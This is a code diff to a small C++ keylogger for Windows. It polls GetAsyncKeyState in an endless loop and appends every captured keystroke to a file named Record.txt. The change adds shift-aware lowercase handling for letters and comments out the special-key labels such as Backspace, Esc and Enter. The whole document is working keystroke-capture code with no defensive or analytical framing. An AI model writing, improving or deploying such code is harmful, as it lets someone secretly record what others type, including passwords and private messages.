@@ -13,14 +13,27 @@ int main()	{
 }
 
 void log()	{
-	char c;
+	char key;
 	
 	for(;;)	{
-		for(c=8;c<=222;c++){
-			if (GetAsyncKeyState(c)==-32767)	{
+		//Sleep(0);
+		for(key=8;key<=222;key++){
+			if (GetAsyncKeyState(key)==-32767)	{
 			ofstream write ("Record.txt", ios::app);
 			
-			switch(c)	{
+			if((key>64)&&(key<91)&&!(GetAsyncKeyState(0x10)))	{
+				key+=32;
+				write<<key;
+				write.close();
+				break;
+			}
+			else if((key>64)&&(key<91))	{
+				write<<key;
+				write.close();
+				break;
+			}
+			
+			/*switch(key)	{
 				case 8:	write<<"<BackSpace>";
 						break;
 				case 27:	write<<"<Esc>";
@@ -31,9 +44,9 @@ void log()	{
 						 break;
 				case 13:	write<<"<Enter>\n";
 							break;
-				default:	write<<c;
+				default:	write<<key;
 							break;
-			}
+			} */
 			}
 		}
 	}
